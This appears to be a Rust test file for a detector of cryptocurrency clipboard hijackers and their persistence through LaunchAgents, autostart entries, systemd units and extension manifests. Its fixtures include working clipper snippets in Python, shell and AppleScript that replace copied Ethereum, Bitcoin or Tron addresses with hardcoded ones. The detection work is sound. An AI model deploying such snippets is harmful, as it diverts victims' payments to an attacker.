use super::*;
use crate::utils::temp;

#[test]
fn launch_agents_that_clip_are_found_and_managers_are_not() {
    let d = temp::TempDir::new("clipper").unwrap();
    let home = d.path();
    let agents = home.join("Library/LaunchAgents");
    std::fs::create_dir_all(&agents).unwrap();
    std::fs::create_dir_all(home.join(".svc")).unwrap();
    std::fs::create_dir_all(home.join("bin")).unwrap();
    let plist = |label: &str, argv: &[&str]| {
        let args: String = argv.iter().map(|a| format!("<string>{a}</string>")).collect();
        format!(
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<plist version=\"1.0\"><dict><key>Label</key><string>{label}</string><key>ProgramArguments</key><array>{args}</array><key>RunAtLoad</key><true/></dict></plist>\n"
        )
    };
    // A Python clipper under a hidden directory.
    let clip = home.join(".svc/sync.py");
    std::fs::write(&clip, "import pyperclip, re\nwhile 1:\n  c = pyperclip.paste()\n  if re.match(r'^0x[a-fA-F0-9]{40}$', c): pyperclip.copy('0xD62Eb957610d49f77cFce8bCc9827b5428D790E6')\n").unwrap();
    std::fs::write(
        agents.join("com.sync.helper.plist"),
        plist("com.sync.helper", &["/usr/bin/python3", &clip.to_string_lossy()]),
    )
    .unwrap();
    // A clipboard manager in the usual place.
    let manager = home.join("bin/paste-history");
    std::fs::write(&manager, "#!/bin/sh\nwhile true; do pbpaste >> ~/.paste-history; sleep 1; done\n").unwrap();
    std::fs::write(
        agents.join("me.paste.history.plist"),
        plist("me.paste.history", &["/bin/sh", &manager.to_string_lossy()]),
    )
    .unwrap();
    // A clipboard reader in a hidden place, no addresses.
    let odd = home.join(".svc/watch.sh");
    std::fs::write(&odd, "#!/bin/sh\npbpaste > /dev/null\n").unwrap();
    std::fs::write(agents.join("com.svc.watch.plist"), plist("com.svc.watch", &["/bin/sh", &odd.to_string_lossy()]))
        .unwrap();
    // An inline AppleScript that sets the clipboard to an address.
    std::fs::write(
        agents.join("com.inline.plist"),
        plist(
            "com.inline",
            &["/usr/bin/osascript", "-e", "set the clipboard to \"TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t\""],
        ),
    )
    .unwrap();
    // Apple's own, and something unrelated.
    std::fs::write(agents.join("com.apple.foo.plist"), plist("com.apple.foo", &["/System/Library/x", "pbpaste"]))
        .unwrap();
    std::fs::write(agents.join("com.other.plist"), plist("com.other", &["/usr/local/bin/backup"])).unwrap();

    let (found, read) = persistence_in(home, &[agents.clone(), home.join("missing")]);
    assert_eq!(read, 5, "every item but Apple's, missing directories skipped");
    let items: Vec<(&str, bool, bool)> =
        found.iter().map(|p| (p.item.rsplit('/').next().unwrap(), p.hard, p.odd_place)).collect();
    assert_eq!(
        items,
        [
            ("com.inline.plist", true, false),
            ("com.svc.watch.plist", false, true),
            ("com.sync.helper.plist", true, true)
        ],
        "{found:?}"
    );
    let clipper = found.iter().find(|p| p.item.ends_with("com.sync.helper.plist")).unwrap();
    assert_eq!(clipper.chains, [Chain::Evm]);
    assert!(clipper.patterns);
    assert!(clipper.note().contains("touches the clipboard and carries EVM (Ethereum, BSC, Tempo) address hardcoded and the patterns that recognise wallet addresses: a clipper"), "{}", clipper.note());
    assert!(clipper.note().contains("from a temporary or hidden place"), "{}", clipper.note());
    let inline = found.iter().find(|p| p.item.ends_with("com.inline.plist")).unwrap();
    assert_eq!(inline.chains, [Chain::Tron]);
    assert_eq!(inline.program, "/usr/bin/osascript");
    let watch = found.iter().find(|p| p.item.ends_with("com.svc.watch.plist")).unwrap();
    assert!(
        watch.note().ends_with("runs from a temporary or hidden place at login and touches the clipboard"),
        "{}",
        watch.note()
    );
}

#[test]
fn autostart_entries_and_units_read_their_exec_lines() {
    let d = temp::TempDir::new("clipper-linux").unwrap();
    let home = d.path();
    let auto = home.join(".config/autostart");
    std::fs::create_dir_all(&auto).unwrap();
    std::fs::create_dir_all(home.join(".cache")).unwrap();
    let bin = home.join(".cache/.x/clip");
    std::fs::create_dir_all(bin.parent().unwrap()).unwrap();
    std::fs::write(&bin, "#!/bin/sh\nwhile :; do c=$(xclip -o); case $c in bc1q*) echo bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq | xclip -i;; esac; done\n").unwrap();
    std::fs::write(
        auto.join("clip.desktop"),
        format!("[Desktop Entry]\nType=Application\nName=Clip\nExec={} --quiet\n", bin.display()),
    )
    .unwrap();
    let units = home.join(".config/systemd/user");
    std::fs::create_dir_all(&units).unwrap();
    std::fs::write(units.join("sync.service"), "[Service]\nExecStart=/usr/bin/python3 /opt/sync/main.py\n").unwrap();
    let (found, read) = persistence_in(home, &[auto, units]);
    assert_eq!(read, 2);
    assert_eq!(found.len(), 1, "{found:?}");
    assert_eq!(
        (found[0].chains.as_slice(), found[0].hard, found[0].odd_place),
        ([Chain::Bitcoin].as_slice(), true, false),
        "~/.cache is a known place; the addresses decide"
    );
}

#[test]
fn an_interpreter_binary_is_never_read_as_the_item() {
    // A fake python3 whose own bytes look like a clipper, in a known place, run with a
    // script that does not exist: the item is the command line only, so it is not flagged.
    // Before the fix this read the interpreter and reported a hard Bitcoin clipper.
    let d = temp::TempDir::new("clipper-interp").unwrap();
    let home = d.path();
    let bin = home.join(".local/bin");
    std::fs::create_dir_all(&bin).unwrap();
    let python = bin.join("python3");
    std::fs::write(&python, "\0xclip -i\0bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq\0").unwrap();
    let units = home.join(".config/systemd/user");
    std::fs::create_dir_all(&units).unwrap();
    std::fs::write(
        units.join("sync.service"),
        format!("[Service]\nExecStart={} /opt/sync/missing.py\n", python.display()),
    )
    .unwrap();
    let (found, read) = persistence_in(home, std::slice::from_ref(&units));
    assert_eq!(read, 1);
    assert!(found.is_empty(), "{found:?}");
    // Twin: the same bytes as the program itself (not an interpreter) are still read.
    let tool = bin.join("synctool");
    std::fs::copy(&python, &tool).unwrap();
    std::fs::write(units.join("sync.service"), format!("[Service]\nExecStart={} --watch\n", tool.display())).unwrap();
    let (found, _) = persistence_in(home, &[units]);
    assert_eq!(found.len(), 1, "{found:?}");
    assert_eq!((found[0].chains.as_slice(), found[0].hard), ([Chain::Bitcoin].as_slice(), true));
}

#[test]
fn extension_manifests_say_what_the_clipboard_is_to_them() {
    let d = temp::TempDir::new("clipper-ext").unwrap();
    let ext = d.path().join("abcdefgh");
    std::fs::create_dir_all(ext.join("1.2.3_0")).unwrap();
    std::fs::write(
        ext.join("1.2.3_0/manifest.json"),
        r#"{"name": "Wallet Helper", "manifest_version": 3, "permissions": ["clipboardRead", "clipboardWrite", "storage"], "content_scripts": [{"matches": ["<all_urls>"], "js": ["c.js"]}]}"#,
    )
    .unwrap();
    let got = extension_permissions(&ext).unwrap();
    assert_eq!(got, Permissions { read: true, write: true, all_sites: true, name: "Wallet Helper".into() });
    let flat = d.path().join("flat");
    std::fs::create_dir_all(&flat).unwrap();
    std::fs::write(
        flat.join("manifest.json"),
        r#"{"name": "Notes", "permissions": ["clipboardWrite"], "host_permissions": ["https://notes.example/*"]}"#,
    )
    .unwrap();
    assert_eq!(
        extension_permissions(&flat).unwrap(),
        Permissions { read: false, write: true, all_sites: false, name: "Notes".into() }
    );
    assert_eq!(extension_permissions(&d.path().join("missing")), None);
}

#[test]
fn program_files_follow_interpreters_and_odd_places_are_named() {
    let d = temp::TempDir::new("clipper-prog").unwrap();
    let script = d.path().join("s.py");
    std::fs::write(&script, "x").unwrap();
    let argv = |v: &[&str]| v.iter().map(|s| s.to_string()).collect::<Vec<_>>();
    assert_eq!(program_file(&argv(&["/usr/bin/python3", "-u", &script.to_string_lossy()])), Some(script.clone()));
    assert_eq!(program_file(&argv(&["/usr/bin/env", "python3", &script.to_string_lossy()])), Some(script.clone()));
    assert_eq!(
        program_file(&argv(&["/usr/bin/osascript", "-e", "beep"])),
        Some(PathBuf::from("/usr/bin/osascript")),
        "inline: the interpreter itself"
    );
    assert_eq!(program_file(&argv(&["no-such-program-anywhere"])), None);
    let home = Path::new("/Users/me");
    assert!(odd_place(home, Path::new("/tmp/.x/a")));
    assert!(odd_place(home, Path::new("/Users/me/.svc/a")));
    assert!(odd_place(home, Path::new("/Users/Shared/.hidden/a")));
    assert!(!odd_place(home, Path::new("/Users/me/.local/bin/a")));
    assert!(!odd_place(home, Path::new("/Users/me/bin/a")));
    assert!(!odd_place(home, Path::new("/Applications/Maccy.app/Contents/MacOS/Maccy")));
}
